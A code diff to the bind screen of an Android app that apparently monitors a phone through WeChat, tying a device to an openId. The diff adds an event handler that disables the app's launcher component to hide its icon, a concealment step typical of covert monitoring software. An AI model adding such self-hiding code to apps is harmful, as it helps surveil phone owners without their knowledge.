@@ -4,6 +4,7 @@ import android.app.Activity;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.support.annotation.Nullable;
 import android.support.design.widget.TextInputLayout;
@@ -19,6 +20,9 @@ import com.zou.wechatdetector.bean.GsonAddDeviceBean;
 import com.zou.wechatdetector.bean.GsonBindUserBean;
 import com.zou.wechatdetector.bean.GsonGetDeviceListBean;
 import com.zou.wechatdetector.utils.Constants;
+
+import org.greenrobot.eventbus.EventBus;
+import org.greenrobot.eventbus.Subscribe;
 
 import java.util.ArrayList;
 
@@ -51,7 +55,7 @@ public class BindActivity extends Activity{
 
         btn_bind.setOnClickListener(v -> {
             if(et_username.getText().toString().isEmpty()){
-                textInputLayout_username.setError("微信号不能为空！");
+                textInputLayout_username.setError("openId不能为空！");
                 return;
             }
             if(et_devicename.getText().toString().isEmpty()){
@@ -62,20 +66,13 @@ public class BindActivity extends Activity{
         });
 
         sp = getSharedPreferences("detector",0);
-//        if(sp.getBoolean("fristTime",true)){
+        if(sp.getBoolean("fristTime",true)){
             //第一次进入应用
             sp.edit().putBoolean("fristTime",false).apply();
-//            new AlertDialog.Builder(this).setView(R.layout.dialog_bind).setCancelable(false).setTitle("绑定微信号").setMessage("绑定后，您可以使用该微信号关注公众号，来进行监控。").setPositiveButton("绑定", new DialogInterface.OnClickListener() {
-//                @Override
-//                public void onClick(DialogInterface dialog, int which) {
-//                    Intent intent = new Intent(BindActivity.this,MainActivity.class);
-//                    startActivity(intent);
-//                }
-//            }).show();
-//        }else {
-//            Intent intent = new Intent(BindActivity.this,MainActivity.class);
-//            startActivity(intent);
-//        }
+        }else {
+            Intent intent = new Intent(BindActivity.this,MainActivity.class);
+            startActivity(intent);
+        }
     }
 
     private void initView() {
@@ -96,7 +93,16 @@ public class BindActivity extends Activity{
                 .baseUrl(Constants.BASE_URL)
                 .build();
         bindService = retrofit.create(BindService.class);
+        EventBus.getDefault().register(this);
+    }
 
+    @Subscribe
+    public void onEvent(Intent data){
+        // 将app图标隐藏：
+        PackageManager p = getPackageManager();
+        p.setComponentEnabledSetting(getComponentName(),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
     }
 
     private void bindUser(){
@@ -199,12 +205,12 @@ public class BindActivity extends Activity{
     }
 
     private void showBindDialog(){
-        new AlertDialog.Builder(this).setTitle("绑定微信号").setMessage("您要绑定的微信号为"+et_username.getText().toString()+"。绑定后，您可以使用该微信号关注公众号，来进行监控。确定要使用该微信号进行绑定吗？")
+        new AlertDialog.Builder(this).setTitle("绑定openId").setMessage("您要绑定的openId为"+et_username.getText().toString()+"。一旦绑定，无法更改。确定要使用该openid进行绑定吗？")
                 .setPositiveButton("绑定", (dialog, which) -> bindUser()).setNegativeButton("重新输入", null).show();
     }
 
     private void showAlreadyBindDialog(){
-        new AlertDialog.Builder(this).setTitle("该微信号已绑定").setMessage("微信号"+et_username.getText().toString()+"已经绑定过，您可以选择添加新设备 "+et_devicename.getText().toString()+" ，或者覆盖以前的设备。")
+        new AlertDialog.Builder(this).setTitle("该openId已绑定").setMessage(et_username.getText().toString()+"已经绑定过，您可以选择添加新设备 "+et_devicename.getText().toString()+" ，或者覆盖以前的设备。")
                 .setPositiveButton("添加新设备", (dialog, which) -> addDevice()).setNegativeButton("覆盖设备", (dialog, which) -> selectDevice()).show();
     }
 
